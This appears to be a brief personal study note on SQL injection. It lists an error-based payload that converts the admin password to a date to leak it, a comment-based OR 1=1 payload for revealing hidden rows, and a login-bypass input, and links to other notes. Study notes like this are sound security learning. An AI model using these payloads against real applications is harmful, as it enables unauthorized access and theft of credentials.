
triggers error in the database to collect info:

  - `CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE);`
  
  * getting hidden data:
    * sql comments: `--` => `''+OR+1=1--` [[sqli examples#sqli in WHERE clause| in WHERE clause to get hidden data]].
	
  * changing application logic:
    * mysql payload: `uname=' or 1=1;` or perhaps `#` to [[sqli examples#allowing login bypass | login bypass]].
	